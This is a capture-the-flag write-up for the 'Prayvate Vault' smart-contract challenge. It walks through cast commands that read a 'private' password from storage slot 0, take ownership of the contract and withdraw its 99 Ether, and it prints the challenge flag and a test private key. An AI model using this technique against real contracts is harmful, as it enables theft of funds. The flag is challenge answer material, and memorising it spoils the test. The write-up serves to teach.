# Prayvate Vault Write-up

## TL;DR
The goal of this challenge is to drain the target contract of its balance, this can be achieved by obtaining the vault password, transferring the ownership to ourselves, and then withdrawing all the Ether in the contract.

### 1 - Obtaining the Password
The password is stored in a private state variable in the target contract address, but making a variable `private` does not mean that it cannot be accessed from the outside world. Because of the transparent nature of the blockchain, all data stored within contracts, including private state variables, can be accessed by anyone who has access to the network.
The password will be stored in the contract storge, the storage of a contract is arranged as slots from 0 to 2^256, and because the password is the first state variable declared in the cotract, we will find it at slot number 0.

- We first get our target contract address:
```bash
$cast call 0x0Fd95c39DCD0ef038De7c285B4dB92BD0504742d "getTargetAddress()" --rpc-url http://localhost:8545/db01b9e4-c96b-4123-9b26-7b743061b69b
0x0000000000000000000000004bc94316265619348cbc7b791693f2dd2a2eb73d
```
- And then we obtain the vault password using the following command:
```bash
$cast storage 0x4bc94316265619348cbc7b791693f2dd2a2eb73d 0 --rpc-url http://localhost:8545/db01b9e4-c96b-4123-9b26-7b743061b69b
0x00000000000000000000000000000000cd8115b7bcd966b5e174868b7d30445d
```
So the password is `0xcd8115b7bcd966b5e174868b7d30445d` in bytes. (Yours will be different)

### 2 - Gaining Ownership
The `changeAccount()` function expects two arguments, so we need to call it with the vault password and our account address in order to transfer the vault's ownership to ourselves.
```bash
$cast send 0x4bc94316265619348cbc7b791693f2dd2a2eb73d "changeAccount(address,bytes16)" 0x9A0125306aDc57A34Bd192DC54CEAA7438EF589F 0xcd8115b7bcd966b5e174868b7d30445d --rpc-url http://localhost:8545/db01b9e4-c96b-4123-9b26-7b743061b69b --private-key 0x89281eddf83141d5522b692166ea51b8d125740d6bbf5fbf94374c7b26b1d151
```
```bash
$cast call 0x4bc94316265619348cbc7b791693f2dd2a2eb73d "owner()" --rpc-url http://localhost:8545/db01b9e4-c96b-4123-9b26-7b743061b69b
0x0000000000000000000000009a0125306adc57a34bd192dc54ceaa7438ef589f
```
We are `owner` !
### Draining the Balance
The contract's balance is set in the setup contract to 99 Ether, so we will send this amount of ether to our address.
```bash
$cast send 0x4bc94316265619348cbc7b791693f2dd2a2eb73d "safeWithdraw(uint256)" 99 --rpc-url http://localhost:8545/db01b9e4-c96b-4123-9b26-7b743061b69b --private-key 0x89281eddf83141d5522b692166ea51b8d125740d6bbf5fbf94374c7b26b1d151
```
Congrats, you're now rich !

## Flag
`shellmates{pr1v4CY?__0R_PR4Y_tH4t_THeY_w0n7_sEE?}`
